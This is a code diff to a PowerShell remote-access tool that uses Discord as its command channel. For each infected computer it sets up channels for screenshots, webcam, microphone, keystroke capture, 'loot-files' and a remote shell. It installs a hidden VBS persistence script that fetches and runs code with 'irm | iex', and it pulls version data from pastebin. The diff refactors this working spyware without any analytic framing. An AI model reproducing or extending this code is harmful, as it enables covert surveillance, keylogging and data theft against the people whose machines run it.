@@ -1,3 +1,4 @@
+
 # =====================================================================================================================================================
 <#
 **SETUP**
@@ -63,6 +64,17 @@ Function GetFfmpeg{
         rm -Path $zipFilePath -Force
         rm -Path $extractedDir -Recurse -Force
     }
+}
+
+Function Get-BotUserId {
+    $headers = @{
+        'Authorization' = "Bot $token"
+    }
+    $wc = New-Object System.Net.WebClient
+    $wc.Headers.Add("Authorization", $headers.Authorization)
+    $botInfo = $wc.DownloadString("https://discord.com/api/v10/users/@me")
+    $botInfo = $botInfo | ConvertFrom-Json
+    return $botInfo.id
 }
 
 # Create a new category for text channels function
@@ -2157,42 +2169,91 @@ sendMsg -Embed $jsonPayload
 If ($hideconsole -eq 1){ 
     HideWindow
 }
-Function Get-BotUserId {
+
+
+$global:botId = Get-BotUserId
+
+
+
+Function EnsureCategoryAndChannels {
+
     $headers = @{
         'Authorization' = "Bot $token"
     }
+
     $wc = New-Object System.Net.WebClient
     $wc.Headers.Add("Authorization", $headers.Authorization)
-    $botInfo = $wc.DownloadString("https://discord.com/api/v10/users/@me")
-    $botInfo = $botInfo | ConvertFrom-Json
-    return $botInfo.id
+
+    # Get guilds
+    $guilds = ($wc.DownloadString("https://discord.com/api/v10/users/@me/guilds") | ConvertFrom-Json)
+    $guildID = $guilds[0].id   # assuming first guild
+
+    # Get all channels in guild
+    $channels = ($wc.DownloadString("https://discord.com/api/v10/guilds/$guildID/channels") | ConvertFrom-Json)
+
+    # Try to find existing category
+    $existingCategory = $channels | Where-Object {
+        $_.type -eq 4 -and $_.name -eq $env:COMPUTERNAME
+    }
+
+    if ($existingCategory) {
+        Write-Host "Category already exists. Reusing..."
+
+        $global:CategoryID = $existingCategory.id
+
+        # Get child channels
+        $childChannels = $channels | Where-Object {
+            $_.parent_id -eq $CategoryID
+        }
+
+        foreach ($ch in $childChannels) {
+            switch ($ch.name) {
+                "session-control" { $global:SessionID = $ch.id; $global:ch = $ch.id }
+                "screenshots"      { $global:ScreenshotID = $ch.id }
+                "webcam"      { $global:WebcamID = $ch.id }
+                "microphone"       { $global:MicrophoneID = $ch.id }
+                "keycapture"     { $global:keyID = $ch.id }
+                "loot-files"   { $global:LootID = $ch.id }
+                "powershell"       { $global:PowershellID = $ch.id }
+            }
+        }
+
+        Write-Host "Adopted existing channels."
+
+    } else {
+
+
+        # Create category and new channels
+        NewChannelCategory
+        sleep 1
+        NewChannel -name 'session-control'
+        $global:SessionID = $ChannelID
+        $global:ch = $ChannelID
+        sleep 1
+        NewChannel -name 'screenshots'
+        $global:ScreenshotID = $ChannelID
+        sleep 1
+        NewChannel -name 'webcam'
+        $global:WebcamID = $ChannelID
+        sleep 1
+        NewChannel -name 'microphone'
+        $global:MicrophoneID = $ChannelID
+        sleep 1
+        NewChannel -name 'keycapture'
+        $global:keyID = $ChannelID
+        sleep 1
+        NewChannel -name 'loot-files'
+        $global:LootID = $ChannelID
+        sleep 1
+        NewChannel -name 'powershell'
+        $global:PowershellID = $ChannelID
+        sleep 1
+    }
+
 }
-$global:botId = Get-BotUserId
-# Create category and new channels
-NewChannelCategory
-sleep 1
-NewChannel -name 'session-control'
-$global:SessionID = $ChannelID
-$global:ch = $ChannelID
-sleep 1
-NewChannel -name 'screenshots'
-$global:ScreenshotID = $ChannelID
-sleep 1
-NewChannel -name 'webcam'
-$global:WebcamID = $ChannelID
-sleep 1
-NewChannel -name 'microphone'
-$global:MicrophoneID = $ChannelID
-sleep 1
-NewChannel -name 'keycapture'
-$global:keyID = $ChannelID
-sleep 1
-NewChannel -name 'loot-files'
-$global:LootID = $ChannelID
-sleep 1
-NewChannel -name 'powershell'
-$global:PowershellID = $ChannelID
-sleep 1
+
+EnsureCategoryAndChannels
+
 # Download ffmpeg to temp folder
 $Path = "$env:Temp\ffmpeg.exe"
 If (!(Test-Path $Path)){  
@@ -2230,7 +2291,7 @@ sendMsg -Embed $jsonPayload
 }
 
 Function VersionCheck {
-    $versionCheck = irm -Uri "https://pastebin.com/raw/3axupAKL"
+    $versionCheck = irm -Uri "pastebin.com/raw/3axupAKL"
     $VBpath = "C:\Windows\Tasks\service.vbs"
     if (Test-Path "$env:APPDATA\Microsoft\Windows\PowerShell\copy.ps1"){
     Write-Output "Persistance Installed - Checking Version.."
@@ -2241,7 +2302,7 @@ Function VersionCheck {
             $tobat = @"
 Set WshShell = WScript.CreateObject(`"WScript.Shell`")
 WScript.Sleep 200
-WshShell.Run `"powershell.exe -NonI -NoP -Ep Bypass -W H -C `$tk='$token'; irm $parent | iex`", 0, True
+WshShell.Run `"powershell.exe -Ep Bypass -C `$tk='$token'; irm $parent | iex`", 0, True
 "@
             $tobat | Out-File -FilePath $VBpath -Force
             sleep 1
@@ -2396,7 +2457,3 @@ while ($true) {
     }
     Sleep 3
 }
-
-
-
-
